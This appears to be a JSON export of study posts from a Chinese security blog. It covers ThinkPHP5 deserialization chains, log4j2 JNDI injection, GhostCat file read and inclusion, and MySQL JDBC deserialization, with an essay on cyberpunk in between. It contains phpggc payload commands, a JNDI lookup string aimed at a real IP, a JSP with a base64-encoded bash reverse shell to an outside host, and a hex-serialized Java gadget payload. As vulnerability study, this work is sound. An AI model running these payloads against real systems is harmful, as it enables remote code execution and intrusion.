payload的值(也就是\u0026lt;where\u0026gt;AAAxxxxxx那个东西)是被赋值给了set函数的name参数, 但是第二次进入的时候, name参数tag值, value参数是payload.\n最后在这次set函数中, 成功将payload拼接在了exit后面, 并使用php://filter成功绕过, 当然,通过getCacheKey方法得到的文件名只不过是对tag值的一次md5而已.\n到此为止,成功写入文件, 需要注意的是phpggc生成的这个payload写入的文件文件名是固定的3b58a9545013e88c7186db11bb158c44.php, 理由前面说过, 就是该文件名的生成就null值的md5再拼接上字符串tag_然后再进行md5.\n整体思路如下, 感觉最关键的还是在setTagItem那一步, 那一步将原本是key的payload变成了value参数, 并使其在后面成功被写入文件.\nthink\\Process#__destruct --\u0026gt; think\\Process#stop --\u0026gt; think\\model\\relation\\HasMany#close --\u0026gt; think\\model\\relation\\HasMany#__call --\u0026gt; think\\model\\relation\\HasMany#baseQuery --\u0026gt; think\\console\\Output#where --\u0026gt; think\\console\\Output#__call --\u0026gt; call_user_func_array --\u0026gt; think\\console\\Output#block --\u0026gt; writeln --\u0026gt; write --\u0026gt; think\\session\\driver\\Memcache#write --\u0026gt; think\\cache\\driver\\Memcached#set (1) --\u0026gt; think\\cache\\driver\\Memcached#has --\u0026gt; think\\cache\\driver\\File#get --\u0026gt; getCacheKey --\u0026gt; 将php://filter伪协议拼接到开头,返回php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php ,注意这个文件不是目标文件 --\u0026gt; think\\cache\\driver\\Memcached#getCacheKey 返回\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt; --\u0026gt; think\\cache\\driver\\File#set --\u0026gt; getCacheKey获取文件名,对\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;进行md5之后进行拼接成为php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php,同时这里可以进行一个mkdir,然而这里的目录名是非法的,然后返回文件名 --\u0026gt; 回到set方法,$data前面拼接上了死亡exit,进行file_put_contents,生成文件 6a644d26b09257b882dae6e407f23d42.php,内容为乱码 --\u0026gt; 回到(1) 函数 --\u0026gt; think\\cache\\driver\\Memcached#setTagItem 生成可控的tag名--\u0026gt; 再次进入think\\cache\\driver\\Memcached#set , 两个参数都可控 --\u0026gt; think\\cache\\driver\\File#set 参数是前面的两个参数 --\u0026gt; getCacheKey 将tag名进行md5之后进行拼接得到 php://filter/convert.base64-decode/resource=/srv/http/tp5/3b58a9545013e88c7186db11bb158c44.php --\u0026gt; 回到\\think\\cache\\driver\\File#set 对之前可控参数之一data进行死亡exit拼接,并进行file_put_contents,效果就是file_put_contents(\u0026#39;php://filter/convert.base64-decode/resource=/srv/http/tp5/3b58a9545013e88c7186db11bb158c44.php\u0026#39;, \u0026#39;\u0026lt;?php\\n//000000000000\\nexit();?\u0026gt;\\ns:46:\u0026#34;\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;\u0026#34;;\u0026#39;) --\u0026gt; 文件写入成功,内容为乱码+php代码 5.0.24 RCE 环境搭建 同上\n漏洞分析 首先生成payload\n./phpggc ThinkPHP/RCE2 system \u0026#34;touch /tmp/helloman\u0026#34; | base64 -w 0 开始调试前, 请确认你的php环境的版本, 如果版本是php7.x, 请打开文件thinkphp/library/think/db/Query.php 看第400行代码, 这里使用我的带有警告提示的vim看:\n这种写法在php7.x中已经被弃用, 具体是哪一个子版本我没有深究. 总之, 如果发现payload不能执行, 请切换自己的php版本, 或者像我一样将这一行删掉改成上图第400行.\nPS: 这里要吐槽一下Arch Linux Aur里面的php56-xdebug包\u0026hellip;17年开始就不更新了, 21年都有用户在评论说得修改构建文件才可以安装.\n好了, 下面开始调试.\n第一部分, 和过往thinkphp5.0.24写文件反序列化链的前半部分一样,具体可以参考https://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/#more , 这里就简单说明.\n首先进入think\\process\\pipes\\Windows#__destruct的think\\process\\pipes\\Windows#removeFiles, 其中的file_exists函数会触发think\\model\\Pivot#__toString, 然后think\\model\\Pivot会触发内部的toJson 然后触发toArray, 在这个函数中, 控制代码执行到912行的$value-\u0026gt;getAttr($attr), $value是think\\console\\Output对象, 这会触发think\\console\\Output#__call\n接下来触发think\\console\\Output的block writeln write 三个方法\nhandle是think\\session\\driver\\Memcached对象\nhandler是think\\cache\\driver\\Memcache对象, 它的set 方法会调用它的has方法\n这里, handler是think\\Request对象, rce最终将会在这个对象中触发, 跟进可以看到调用了input方法\n在input方法中, input方法的参数如下\npublic function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) 输入的参数如下\n经过了一系列对数组的处理后 , 代码进入$filter = $this-\u0026gt;getFilter($filter, $default);\n在这里, \u0026ldquo;system\u0026rdquo; 字符串会被赋予给filter并转换为数组后返回\n接下来代码执行到$this-\u0026gt;filterValue($data, $name, $filter);输入如下\n到这里代码执行完成.\n完整调用链条\nthink\\process\\pipes\\Windows#__destruct --\u0026gt; think\\process\\pipes\\Windows#removeFiles --\u0026gt; file_exists --\u0026gt; think\\model\\Pivot#__toString --\u0026gt; think\\model\\Pivot#toJson --\u0026gt; think\\model\\Pivot#toArray --\u0026gt; $value-\u0026gt;getAttr($attr) --\u0026gt; think\\console\\Output#__call --\u0026gt; think\\console\\Output#block --\u0026gt; think\\console\\Output#writeln --\u0026gt; think\\console\\Output#write --\u0026gt; $this-\u0026gt;handle-\u0026gt;write --\u0026gt; think\\session\\driver\\Memcached#write --\u0026gt; $this-\u0026gt;handler-\u0026gt;set --\u0026gt; think\\cache\\driver\\Memcache#set --\u0026gt; think\\cache\\driver\\Memcache#has --\u0026gt; $this-\u0026gt;handler-\u0026gt;get --\u0026gt; think\\Request#get --\u0026gt; think\\Request#input --\u0026gt; think\\Request#filterValue --\u0026gt; call_user_fund($filter, $value) ps: 该链子的前半部分可以使用FW1链子的前半部分 ,也就是\nthink\\Process#__destruct --\u0026gt; think\\Process#stop --\u0026gt; think\\model\\relation\\HasMany#close --\u0026gt; think\\model\\relation\\HasMany#__call --\u0026gt; think\\model\\relation\\HasMany#baseQuery --\u0026gt; think\\console\\Output#where --\u0026gt; think\\console\\Output#__call 5.1.x-5.2.x RCE 环境搭建 ./phpggc ThinkPHP/RCE1 system id | base64 -w 0 composer create-project topthink/think=5.1.41 thinkphp5141 --prefer-dist 和之前一样,写入一个反序列化入口.\n漏洞分析 首先,反序列化进入think\\process\\pipes\\Windows#__destruct, 进入removeFiles方法\nfilename 是 think\\model\\Pivot 对象, file_exists方法触发__toString方法, 经过toJson 方法后触发toArray方法, 部分代码如下\nthink\\model\\Pivot-\u0026gt;data从父类think\\model中获取, relation为空, 得到结果为{smi1e =\u0026gt; \u0026quot;id\u0026quot;}\n接着触发$this-\u0026gt;getAttr($key), key是smi1e.\n首先通过getData函数,获取到字符串id, 然后通过$this-\u0026gt;withAttr[$fieldName] 获取到system字符串, 中间能跳过的if判断都跳过\n最后在第493进行动态执行, 这里传入的参数有两个,第一个就是要执行的命令, 第二个根据php手册, 应该是int类型的引用变量, 负责记录命令执行 的结果, 但是这里为什么传入第二个参数是数组却还是可以执行呢? 我也不知道, 不过确实是可以的, 可以执行以下代码来验证\n\u0026lt;?php $a = [\u0026#34;smile\u0026#34;=\u0026gt;\u0026#34;id\u0026#34;]; system(\u0026#34;touch flag\u0026#34;,$a); think\\process\\pipes\\Windows#__destruct --\u0026gt; think\\process\\pipes\\Windows#removeFiles --\u0026gt; file_exists --\u0026gt; think\\model\\Pivot#__toString --\u0026gt; think\\model\\Pivot#toJson --\u0026gt; think\\model\\Pivot#toArray --\u0026gt; think\\model\\Pivot#getAttr --\u0026gt; think\\model\\Pivot#getData 获取命令字符串 --\u0026gt; 通过可控数组索引获取system字符串, b ","permalink":"https://ch3n9w.github.io/posts/sec-phpggc-thinkphp/","summary":"\u003cblockquote\u003e\n\u003cp\u003ephpggc中关于thinkphp的攻击思路学习\u003c/p\u003e\n\u003c/blockquote\u003e","title":"thinkphp5漏洞学习"},{"content":" 明天安全圈校招面试: 面试官: 请说说你会什么技能? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 请说说你最近关注过的漏洞? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 你平时有动手调试过吗? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 我：这dnslog是不是卡了 这面试官怎么还没rce\n环境搭建 新建maven项目, pom.xml写入\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 在官网 https://archive.apache.org/dist/logging/log4j/ 下载log4j然后在project structure中导入 下载低版本java8 https://repo.huaweicloud.com/java/jdk/ 我下载的是8u181,将其作为java运行环境 写测试代码\nimport org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args){ logger.error(\u0026#34;${jndi:ldap://39.105.176.37:1389/smzifq}\u0026#34;); } } 漏洞调试 调试进入 调试到 然后调试到MessagePatternConverter#format方法, 看到这里会试图匹配${字符.并将payload字符串解析到变量value中去.\n步进replace函数, 再步进substitute函数 进入下一个substitute中会看到它会匹配结尾的} 再往下就可以看到resolveVariable方法被调用, 里面调用了lookup方法 在lookup方法中,会试图寻找:,并将:前面的部分作为prefix, 随后根据prefix来寻找类\n可以看到这里规定了不同的prefix对应的类\n使用的Jndi,所以使用的是JndiLookup类,调用了JndiLookup#lookup方法,并将:后面的部分作为参数传入.\n最后调用到了javax.naming.InitialContext#lookup方法,server端收到请求 漏洞利用 普通的jndi注入就可以了\n参考 https://www.anquanke.com/post/id/262668#h3-5\n","permalink":"https://ch3n9w.github.io/posts/sec-log4j2-jndi/","summary":"\u003cblockquote\u003e\n\u003cp\u003e明天安全圈校招面试:\n面试官: 请说说你会什么技能?\n我: ${jndi:ldap://xxx.dnslog.cn/exp}\n面试官: 请说说你最近关注过的漏洞?\n我: ${jndi:ldap://xxx.dnslog.cn/exp}\n面试官: 你平时有动手调试过吗?\n我: ${jndi:ldap://xxx.dnslog.cn/exp}\n我：这dnslog是不是卡了 这面试官怎么还没rce\u003c/p\u003e\n\u003c/blockquote\u003e","title":"log4j2 jndi 漏洞学习和调试"},{"content":"科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即\u0026quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象\u0026quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.\n另外一方面,正如洛夫克拉夫特所说的\u0026quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧\u0026quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个\u0026quot;发展\u0026quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的\u0026quot;发展\u0026quot;上,即便是内卷式的发展.\n从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:\n资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利\n资本理性的主体在\u0026quot;自己的寿命是有限的\u0026quot;这样一个前提下,会自发选择在\u0026quot;当下\u0026quot;时间点获利最大的发展方向\n当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间\n人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.\n一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是资本意义上能力最强的公司,我担心这种内卷式的崛起会提醒其他资本,最大化的利润完全不需要科技创新,只需要靠\u0026quot;内卷\u0026quot;就可以了.或许,他们已经意识到了?\n其实很久以前就有人预测到了如今的现状,那就是赛伯朋克,它想告诉人们,科技的畸形发展不能解决而会加剧社会矛盾和人类的焦虑,可遗憾的是,在资本的操纵下,这种畸形的科技被繁复炫目的光影包装成了一种美学象征,这种人类的焦虑被刻意淡化甚至抹去,转而重新变成一种商品,一种无论是在商业意义还是精神意义上对资本力量更加有利的商品\u0026ndash;既谋取了利润,又扭曲了对抗虚拟的文学,这出\u0026quot;化敌为友\u0026quot;实在高明至极.\n赛博朋克指出了科技畸形发展所产生的问题,警告人们这样做的后果,但是很可惜,我们已经停不下来了,看起来,我们势必迈入赛伯朋克式的未来社会中,步履坚定,热切真诚.而到了那个时候,或者在那之前,也许更有价值的问题是:我们如何走出赛伯朋克?\n话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.\n","permalink":"https://ch3n9w.github.io/posts/gossip-cyberpunk/","summary":"\u003cp\u003e科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即\u0026quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象\u0026quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.\u003c/p\u003e\n\u003cp\u003e另外一方面,正如洛夫克拉夫特所说的\u0026quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧\u0026quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个\u0026quot;发展\u0026quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的\u0026quot;发展\u0026quot;上,即便是内卷式的发展.\u003c/p\u003e\n\u003cp\u003e从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e资本理性的主体在\u0026quot;自己的寿命是有限的\u0026quot;这样一个前提下,会自发选择在\u0026quot;当下\u0026quot;时间点获利最大的发展方向\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.\u003c/p\u003e\n\u003cp\u003e一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是资本意义上能力最强的公司,我担心这种内卷式的崛起会提醒其他资本,最大化的利润完全不需要科技创新,只需要靠\u0026quot;内卷\u0026quot;就可以了.或许,他们已经意识到了?\u003c/p\u003e\n\u003cp\u003e其实很久以前就有人预测到了如今的现状,那就是赛伯朋克,它想告诉人们,科技的畸形发展不能解决而会加剧社会矛盾和人类的焦虑,可遗憾的是,在资本的操纵下,这种畸形的科技被繁复炫目的光影包装成了一种美学象征,这种人类的焦虑被刻意淡化甚至抹去,转而重新变成一种商品,一种无论是在商业意义还是精神意义上对资本力量更加有利的商品\u0026ndash;既谋取了利润,又扭曲了对抗虚拟的文学,这出\u0026quot;化敌为友\u0026quot;实在高明至极.\u003c/p\u003e\n\u003cp\u003e赛博朋克指出了科技畸形发展所产生的问题,警告人们这样做的后果,但是很可惜,我们已经停不下来了,看起来,我们势必迈入赛伯朋克式的未来社会中,步履坚定,热切真诚.而到了那个时候,或者在那之前,也许更有价值的问题是:我们如何走出赛伯朋克?\u003c/p\u003e\n\u003cp\u003e话说回来,在赛博朋克被提出的那个年代,根本没有人们如今看到的虚拟世界的哪怕一丝影子,我所能想到的,是这些科幻作家们凭借自身少得可怜的科技水平和对人性的充分了解所做出的猜测和臆想,或许他们创作的动机中,根本不包括一丝严肃批判的思考,而只是为了博人眼球来多赚点稿费罢了,但总之,他们猜中了,并且猜得更加超前.或许科技的发展史,就是一副肖像画,画的主题叫做人性.\u003c/p\u003e","title":"赛博内卷"},{"content":" 本文主要参考 https://blog.csdn.net/qq_31481187/article/details/105917392 和 https://paper.seebug.org/1142/#_6 ，并无原创内容，仅仅是个人学习笔记。\n漏洞原理 官网对AJP协议的介绍如下\nThe AJP Connector element represents a Connector component that communicates with a web connector via the AJP protocol. This is used for cases where you wish to invisibly integrate Tomcat into an existing (or new) Apache installation, and you want Apache to handle the static content contained in the web application, and/or utilize Apache\u0026rsquo;s SSL processing.\nhttps://blog.hillpig.top/apache-tomcat-nginx/ 中提到了AJP协议的使用场景，可以参考一下。\n该漏洞主要是由于Tomcat 对从AJP协议传来的数据没有正确解析，导致攻击者可以控制以下三个参数\njavax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path 在tomcat目录下的conf/web.xml中，规定了两种servlet，分别用于处理默认类型的文件（比如静态资源）和JSP类型的路径请求。\n\u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.apache.jasper.servlet.JspServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;fork\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;xpoweredBy\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;load-on-startup\u0026gt;3\u0026lt;/load-on-startup\u0026gt; \u0026lt;/servlet\u0026gt; map规则\n\u0026lt;!-- The mapping for the default servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;!-- The mappings for the JSP servlet --\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;jsp\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.jsp\u0026lt;/url-pattern\u0026gt; \u0026lt;url-pattern\u0026gt;*.jspx\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; 两种servlet导致了两个漏洞：DefaultSevlet导致了文件读取，JspServlet导致了代码执行，后者是以文件包含的形式执行的，因此要利用首先需要在目标服务器上上传文件。通过控制url访问路径，可以选择触发这两种servlet中的任意一种。\n环境搭建 本文漏洞调试在arch linux下进行，其他系统在环境变量设置上有所差异，自行调整。\n首先需要安装 java 8，在arch linux 下执行如下命令即可\nsudo pacman -S jdk8-openjdk 如果事先安装了其他版本的java，在安装jdk8之后可以通过以下命令切换默认java版本\nsudo archlinux-java set java-8-openjdk 然后下载tomcat8和源码\nwget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/bin/apache-tomcat-8.5.30.zip wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.30/src/apache-tomcat-8.5.30-src.zip 将两个都解压，第一个是用来运行tomcat的，第二个是用来在IDEA里面调试的，调试的原理和php的remote debug类似。这里通过5005端口来进行调试通信\n打开第一个文件夹里面的bin/catalina.sh，加入以下代码\nexport JAVA_OPTS=\u0026#39;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005\u0026#39; 然后设置以下的环境变量，这里我将第一个文件解压出来的东西放在了/usr/local/tomcat/下面。\n# for tomcat debug export JAVA_HOME=/usr/lib/jvm/java-8-openjdk export JRE_HOME=$JAVA_HOME/jre export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin export CATALINA_HOME=/usr/local/tomcat/apache-tomcat-8.5.30 export CLASSPATH=$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib:$CATALINA_HOME/lib export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/bin 执行\n./catalina.sh start 访问浏览器8080端口可以看到tomcat默认页面说明搭建成功。\n然后用IDEA打开第二个文件夹中的java目录。添加配置\n下断点，运行debug，然后运行exp脚本，开始调试\npython2 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f WEB-INF/web.xml 127.0.0.1 漏洞调试 文件读取漏洞 这里使用wireshark来抓取exp发出的流量。\n可以看到AJP协议请求中包含了结尾的三个键值对，并且请求的是/asdf路径，因此处理这个请求的是DefaultServlet。\n在org.apache.coyote.ajp.AjpProcessor#service中的prepareRequest打下断点，让程序运行到此，步进。\n在prepareRequest函数里面的for循环中获取了几个特定的请求头信息，然后到这里\n步进\n这里mb还是Upgrade-Insecure-Requests，再步进\n到这里mb的值没变，然后再往下\n变成了攻击的配置项，看看setBytes函数里面做了什么\n看看b的值\n是请求体，然后off的值是255，len的值是33。setBytes函数中对几个变量进行了设置，这里start和end中间的那段字符串就是javax.servlet.include.request_uri。\n然后返回，接下来同样的方法读取了值\n设置\n其他两个配置项都是同样的读取方式，这里不再赘述。到此位置prepareRequest()函数分析完成\n回到prepareRequest函数所在的位置，继续往下\n将请求交给了service函数，步进，一直到这里\n步进，继续调可以看到wrapper选择了DefaultServlet\n继续，一直到DefaultServlet#doGet方法。\nrequest携带着攻击配置项进入了serveResource中，步进，一直到getRelativePath函数，发现这里在尝试获取request请求中的javax.servlet.include.request_uri。\n进入if判断之后又紧接着获取了javax.servlet.include.path_info 和 javax.servlet.include.servlet_path 两个属性，然后在下面进行了拼接返回\n回到DefaultServlet#serveResource， 在这里获取文件资源\n步进，发现会做一个path的验证\n步进validate，发现这里进行了一个normalize操作\n这两个while循环不允许path中出现./和../，会将其替换为空，也就是说文件读取漏洞是不能穿透到上层目录读取的。\n返回到StandarRoot#getResource方法，步进到cache.getResource中\n在这里，获取到了对应web路径下的文件内容并最终返回结果，至此文件读取漏洞分析完毕。\n文件包含漏洞 首先在webapps下面写一个文件，后缀名随意\n\u0026lt;% java.io.InputStream in = Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtYyAnc2ggLWkgJj4vZGV2L3RjcC8zOS4xMDUuMTc2LjM3LzEyMzM0IDA+JjEn}|{base64,-d}|{bash,-i}\u0026#34;).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %\u0026gt; 然后exp里面需要修改这部分\n为\n这样才可以让请求被JspServlet处理。这之后进入org.apache.jasper.servlet.JspServlet，直接在service方法中下断点。运行exp开始调试，跳过前面的prepareRequest环节后，来到这里\n这里和之前一样也获取了javax.servlet.include.path_info等属性，然后进入serviceJspFile方法\n生成了wrapper对象，然后调用了wrapper.service方法，继续调试，看到JspServletWrapper的service方法中调用了getServlet()\n继续往下就可以看到这里了，代码执行成功。\n总结 恶意配置项是如何被解析的，其实还是不是很清楚。另外有必要了解一下servlet的执行过程了。\n","permalink":"https://ch3n9w.github.io/posts/sec-ghostcat/","summary":"\u003cblockquote\u003e\n\u003cp\u003e本文主要参考 \u003ca href=\"https://blog.csdn.net/qq_31481187/article/details/105917392\"\u003ehttps://blog.csdn.net/qq_31481187/article/details/105917392\u003c/a\u003e 和 \u003ca href=\"https://paper.seebug.org/1142/#_6\"\u003ehttps://paper.seebug.org/1142/#_6\u003c/a\u003e ，并无原创内容，仅仅是个人学习笔记。\u003c/p\u003e\n\u003c/blockquote\u003e","title":"GhostCat(CVE-2020-1938)漏洞学习"},{"content":" 我终于更新博客了……\n漏洞原理 当jdbc客户端连接到远程mysql服务器的时候，双方在连接过程中会进行一些数据交换并执行一些查询语句，比如SHOW SESSION STATUS，在使用特定构造的jdbc链接去连接mysql服务器时，SHOW SESSION STATUS的返回数据会在客户端进行反序列化进而触发RCE代码。\n根据 http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ 中的描述，可以通过以下方式手动触发反序列化，注意这不是在触发jdbc反序列化漏洞，但是在后面利用的时候有用。\nCREATE DATABASE IF NOT EXISTS test; CREATE TABLE IF NOT EXISTS test.eviltable ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, evil blob, PRIMARY KEY (`id`) ); set @obj=0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a